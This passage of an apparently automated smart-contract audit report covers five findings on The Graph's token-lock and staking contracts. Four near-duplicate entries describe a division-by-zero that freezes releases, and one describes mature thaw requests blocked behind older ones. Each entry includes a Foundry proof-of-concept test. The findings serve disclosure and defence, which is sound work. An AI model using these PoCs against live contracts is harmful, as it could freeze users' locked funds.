Reject invalid schedules during initialization with `require(_periods <= _endTime - _startTime, "Period duration is zero")`. Consider also requiring exact divisibility or explicitly handling the final partial period and remainder.


## [M-160]. GraphTokenLock schedules with periods greater than duration revert during active release window

## id: IgtuPlhBeBya-D_ZFBl5X

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration/currentPeriod/releasableAmount

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: GraphTokenLock._initialize does not require periods to fit in the duration. periodDuration can be zero, and currentPeriod divides by it. Active schedule views and release/revocation paths therefore revert. This is scoped production code. There is no positive period-duration safeguard. The malformed schedule must be introduced through a privileged creation/configuration path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The initializer requires `_periods >= 1` and `_startTime < _endTime`, but it does not require periods to fit into the duration in seconds. When periods > duration, `periodDuration()` returns zero. `currentPeriod()` then divides by `periodDuration()`, causing active schedule views and release paths to revert. Vulnerable snippet: `function periodDuration() public view returns (uint256) { return duration().div(periods); }` and `return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);`.

## Impact
Affected locks become unusable during the active schedule: releasableAmount, availableAmount, release, and revocation calculations can revert until the schedule passes endTime. This temporarily freezes locked GRT and can block revocation accounting.

## Proof of Concept
1. Initialize a lock with startTime=1000, endTime=1010, and periods=11. 2. The initializer accepts the schedule because periods is at least 1 and startTime is before endTime. 3. During the schedule, periodDuration returns 0. 4. Calling releasableAmount or release reverts due to division by zero.

## Proof of Code
pragma solidity ^0.7.3;\nimport \"forge-std/Test.sol\";\nimport \"../contracts/GraphTokenLockSimple.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontract MockGRT is ERC20 { constructor() ERC20(\"GRT\", \"GRT\") {} function mint(address to, uint256 amount) external { _mint(to, amount); } }\ncontract ZeroPeriodDurationPoC is Test {\n    function testPeriodsGreaterThanDurationBricksActiveSchedule() public {\n        MockGRT token = new MockGRT();\n        GraphTokenLockSimple lock = new GraphTokenLockSimple();\n        address beneficiary = address(0xBEEF);\n        lock.initialize(address(this), beneficiary, address(token), 100 ether, 1000, 1010, 11, 0, 0, IGraphTokenLock.Revocability.Enabled);\n        token.mint(address(lock), 100 ether);\n        vm.warp(1001);\n        assertEq(lock.periodDuration(), 0);\n        vm.expectRevert();\n        lock.releasableAmount();\n    }\n}

## Suggested Mitigation
In `_initialize`, require `_periods <= _endTime - _startTime`, or otherwise define period duration with ceil division and enforce a strictly positive result before storing the schedule.


## [M-161]. Invalid periods parameter can brick active GraphTokenLockWallet releases with division by zero

## id: -o4btWto8SniNvUeJ7TBg

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
Dos

## Location
GraphTokenLock._initialize

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The initializer accepts periods greater than the duration because it only checks startTime < endTime and periods >= 1. periodDuration() then returns zero and currentPeriod() divides by zero, causing active-schedule release and vesting functions to revert. No code path shown prevents this. The affected token lock contracts are in scope. Creating such a wallet requires owner/manager-controlled initialization, so exploitation depends on a privileged configuration action. The behavior is not documented as an accepted risk and exists in today's code.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The initializer requires periods >= 1 but does not require periods <= endTime - startTime. periodDuration() is duration() / periods, so if periods is greater than the lock duration in seconds it becomes zero. currentPeriod() then divides by periodDuration(), causing availableAmount(), vestedAmount(), releasableAmount(), release(), and revoke() paths that depend on vesting math to revert during the active schedule.

Vulnerable snippet:
require(_startTime < _endTime, "Start time > end time");
require(_periods >= MIN_PERIOD, "Periods cannot be below minimum");

function periodDuration() public view override returns (uint256) {
    return duration().div(periods);
}

function currentPeriod() public view override returns (uint256) {
    return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);
}

## Impact
A wallet can be created and funded with a schedule that makes beneficiary releases and owner revocation unusable during the lock lifetime, temporarily freezing managed GRT until the after-endTime branch is reached. For short or mistaken schedules this is a functional DoS of the wallet's core fund-management paths.

## Proof of Concept
1. A wallet is initialized with startTime = 100, endTime = 110, and periods = 11.
2. The initializer succeeds because it only checks startTime < endTime and periods >= 1.
3. periodDuration() returns 10 / 11 = 0.
4. During the active window, release() calls releasableAmount() -> availableAmount() -> passedPeriods() -> currentPeriod().
5. currentPeriod() divides by zero and reverts, so funds cannot be released during the schedule.

## Proof of Code
// test/ZeroPeriodDurationDoS.t.sol
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "../contracts/IGraphTokenLockManager.sol";
contract MockToken is IERC20 { uint256 public override totalSupply; mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; emit Transfer(address(0),to,amount); } function transfer(address to,uint256 amount) external override returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; } function approve(address spender,uint256 amount) external override returns(bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; } function transferFrom(address from,address to,uint256 amount) external override returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; } }
contract MockManager is IGraphTokenLockManager { function getTokenDestinations() external view override returns(address[] memory){ return new address[](0); } function token() external override returns(IERC20){ return IERC20(address(0)); } function setMasterCopy(address) external override {} function createTokenLockWallet(address,address,uint256,uint256,uint256,uint256,uint256,uint256,IGraphTokenLock.Revocability) external override {} function deposit(uint256) external override {} function withdraw(uint256) external override {} function addTokenDestination(address) external override {} function removeTokenDestination(address) external override {} function isTokenDestination(address) external view override returns(bool){ return false; } function setAuthFunctionCall(string calldata,address) external override {} function unsetAuthFunctionCall(string calldata) external override {} function setAuthFunctionCallMany(string[] calldata,address[] calldata) external override {} function getAuthFunctionCallTarget(bytes4) external view override returns(address){ return address(0); } function isAuthFunctionCall(bytes4) external view override returns(bool){ return false; } }
contract ZeroPeriodDurationDoSTest is Test { function testPeriodsGreaterThanDurationBricksReleaseDuringSchedule() public { address beneficiary=address(0xBEEF); MockToken token=new MockToken(); MockManager manager=new MockManager(); GraphTokenLockWallet wallet=new GraphTokenLockWallet(); wallet.initialize(address(manager), address(this), beneficiary, address(token), 1000 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 1000 ether); assertEq(wallet.periodDuration(), 0); vm.warp(105); vm.prank(beneficiary); vm.expectRevert(); wallet.release(); assertEq(token.balanceOf(address(wallet)), 1000 ether); } }

## Suggested Mitigation
In _initialize(), require _endTime - _startTime >= _periods so periodDuration() is nonzero. Also cap passedPeriods() to periods and cap availableAmount() to managedAmount to prevent schedule math from exceeding the configured lock amount.


## [M-162]. Invalid period count can divide by zero and brick GraphTokenLock release schedules

## id: KWKKleZuh8CB9Ht91kuyy

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
GraphTokenLockManager.createTokenLockWallet

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: GraphTokenLockManager forwards _periods to initialize, and GraphTokenLock only checks minimum period count. If periods exceeds duration, periodDuration is zero and currentPeriod divides by zero. The affected release and revoke paths are reachable during the active schedule. No validation blocks the exact issue. Creating the malformed wallet requires the manager owner/admin path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockManager forwards _periods into GraphTokenLockWallet.initialize without requiring _periods <= _endTime - _startTime. GraphTokenLock._initialize only checks _periods >= 1 and _startTime < _endTime, so periodDuration() can become zero. Vulnerable snippet: `function periodDuration() public view returns (uint256) { return duration().div(periods); }` and `function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`. If duration()/periods truncates to 0, currentPeriod(), passedPeriods(), availableAmount(), releasableAmount(), release(), and revocation paths that call vestedAmount() revert during the active schedule.

## Impact
A validly created lock wallet can become unable to compute or release scheduled GRT until after endTime, causing a functional freeze of the locked funds and blocking normal beneficiary release or owner revocation flows.

## Proof of Concept
1. The manager owner creates a lock with startTime=100, endTime=110, periods=11, and a positive managed amount. 2. The wallet initializes successfully because periods >= 1 and startTime < endTime. 3. During the active interval, duration()/periods is 10/11 = 0. 4. Any call to currentPeriod(), availableAmount(), releasableAmount(), release(), or revoke() reaches division by zero and reverts.

## Proof of Code
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/IGraphTokenLock.sol';
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 a) external { balanceOf[to]+=a; } function transfer(address to,uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a,'bal'); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; } function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; } function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a,'bal'); require(allowance[f][msg.sender]>=a,'allow'); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } }
contract DivideByZeroSchedulePoC is Test { function testPeriodsGreaterThanDurationBricksSchedule() public { MockToken token = new MockToken(); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); wallet.initialize(address(this), address(this), address(0xBEEF), address(token), 100 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 100 ether); vm.warp(105); vm.expectRevert(); wallet.availableAmount(); vm.prank(address(0xBEEF)); vm.expectRevert(); wallet.release(); } }

## Suggested Mitigation
Reject schedules whose period duration would be zero: add `require(_periods <= _endTime - _startTime, 'Periods exceed duration');` during initialization or compute vesting using multiplication before division with an explicit cap.


## [L-163]. Invalid period count can brick active token lock schedule functions in GraphTokenLock

## id: 237WhvPdUNGlJuTgfk9dX

## Derived From Pattern/Invariant
Dos: periodDuration must be nonzero for every initialized lock

## Exploit Type
Dos

## Location
GraphTokenLock.availableAmount

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: _initialize accepts a period count greater than the duration because it checks only _periods >= 1 and startTime < endTime. periodDuration then returns zero, and currentPeriod divides by zero during the active schedule. release and revoke paths depend on availableAmount or vestedAmount and can revert. The code is in scope with no complete safeguard, but malformed creation requires the privileged owner/admin path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize requires _periods >= 1 and _startTime < _endTime, but it does not require _periods <= _endTime - _startTime. If periods is greater than the duration in seconds, periodDuration() returns zero. currentPeriod() then divides by periodDuration(), so availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() can revert during the active schedule. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD).

## Impact
Active lock wallets can become temporarily unusable until after endTime. During the active period the beneficiary cannot release vested tokens, and for revocable locks the owner cannot revoke because revoke() depends on vestedAmount()/availableAmount().

## Proof of Concept
1. A lock is created with startTime=1, endTime=11, and periods=11. 2. duration is 10 seconds, so periodDuration returns 0. 3. During the active schedule, currentPeriod divides by zero. 4. release and revoke paths that depend on availableAmount revert, leaving the lock schedule stuck until the contract is past endTime.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract ZeroPeriodDurationPoC is Test {
    function testPeriodDurationZeroBricksActiveSchedule() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        MockERC20 token = new MockERC20();
        GraphTokenLockSimple lock = new GraphTokenLockSimple();
        lock.initialize(owner, beneficiary, address(token), 100 ether, 1, 11, 11, 0, 0, IGraphTokenLock.Revocability.Enabled);
        token.mint(address(lock), 100 ether);
        vm.warp(5);
        assertEq(lock.periodDuration(), 0);
        vm.expectRevert();
        lock.availableAmount();
        vm.prank(beneficiary);
        vm.expectRevert();
        lock.release();
        vm.prank(owner);
        vm.expectRevert();
        lock.revoke();
    }
}

## Suggested Mitigation
Reject schedules where _periods > _endTime - _startTime. Also make currentPeriod/availableAmount robust by returning managedAmount at currentTime() >= endTime and by avoiding division when periodDuration is zero.





Finding Status: InvalidByDesign
## [M-164]. Shortening thawing periods can strand already-mature thaw requests behind older unexpired requests

## id: KY4DD7oqc-P5mYc1RIKRS

## Derived From Pattern/Invariant
MaturityorGatingByPass: mature thaw requests should not be blocked by earlier unexpired requests

## Exploit Type
Dos

## Location
HorizonStaking._traverseThawRequests

## Finding Status: InvalidByDesign
### Finding Status Justification: The behavior is directly implemented in in-scope HorizonStaking. _createThawRequest() appends requests by creation order. _traverseThawRequests() traverses from the list head, and _fulfillThawRequest() returns shouldBreak when the current request's thawingUntil is in the future. The comment explicitly states traversal is by creation date, stops at the first unexpired request, and that later requests may have expired when the thawing period is shortened. This means the code path and liveness effect exist, and no complete safeguard allows fulfilling a later mature request by id or by maturity order. Because the exact behavior is explicitly documented in the code comment, it should be marked by_design for this invalidity check, even though it remains mechanically exploitable.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Thaw requests are stored and traversed by creation order, not by thawingUntil. LinkedList.traverse stops at the first request for which _fulfillThawRequest returns shouldBreak when thawRequest.thawingUntil > block.timestamp. If a provision thawingPeriod is shortened after an older request is created, a later request can mature earlier than the older request but remain unfulfillable because traversal always begins at the list head. Vulnerable snippet: if (thawRequest.thawingUntil > block.timestamp) { return (true, LinkedList.NULL_BYTES); }. The code comment explicitly notes traversal stops at the first unexpired request even if later requests have expired.

## Impact
Delegators or service providers can be unable to withdraw or reprovision already-mature tokens until an older long-period request expires. With long configured thawing periods, this can temporarily freeze delegated or provisioned GRT and break expected withdrawal liveness.

## Proof of Concept
1. A provision has a long thawingPeriod. 2. The owner creates thaw request A, which receives a far-future thawingUntil. 3. The service provider stages and the verifier accepts a shorter thawingPeriod. 4. The same owner creates thaw request B, which has an earlier thawingUntil than A. 5. After B.thawingUntil but before A.thawingUntil, the owner calls deprovision() or withdrawDelegated(). 6. Traversal reaches A first, breaks, and never processes B, even though B is mature.

## Proof of Code
function test_laterMatureThawRequestBlockedByOlderUnexpiredRequest() public {
    address sp = makeAddr("sp");
    address verifier = makeAddr("verifier");
    uint256 stakeAmount = 100 ether;

    stakingHarness.setDeprecatedThawingPeriod(0);
    stakingHarness.setMaxThawingPeriod(type(uint64).max);
    stakingHarness.setServiceProviderStake(sp, stakeAmount, 0);

    vm.prank(sp);
    stakingHarness.provision(sp, verifier, stakeAmount, 0, 100 days);

    vm.prank(sp);
    stakingHarness.thaw(sp, verifier, 10 ether); // request A, expires in 100 days

    vm.prank(sp);
    stakingHarness.setProvisionParameters(sp, verifier, 0, 1 days);
    vm.prank(verifier);
    stakingHarness.acceptProvisionParameters(sp);

    vm.prank(sp);
    stakingHarness.thaw(sp, verifier, 10 ether); // request B, expires in 1 day

    vm.warp(block.timestamp + 2 days);
    uint256 idleBefore = stakingHarness.getIdleStake(sp);

    vm.prank(sp);
    stakingHarness.deprovision(sp, verifier, 0);

    assertEq(stakingHarness.getIdleStake(sp), idleBefore, "mature request B was not fulfilled");
    assertGt(stakingHarness.getThawRequestList(IHorizonStakingTypes.ThawRequestType.Provision, sp, verifier, sp).count, 0);
}

## Suggested Mitigation
Process thaw requests by maturity order, or allow callers to fulfill a specific request id once its own thawingUntil has passed. Alternatively, when shortening thawingPeriod, preserve monotonicity by adjusting existing request ordering or forbidding new requests from maturing before the current list head.



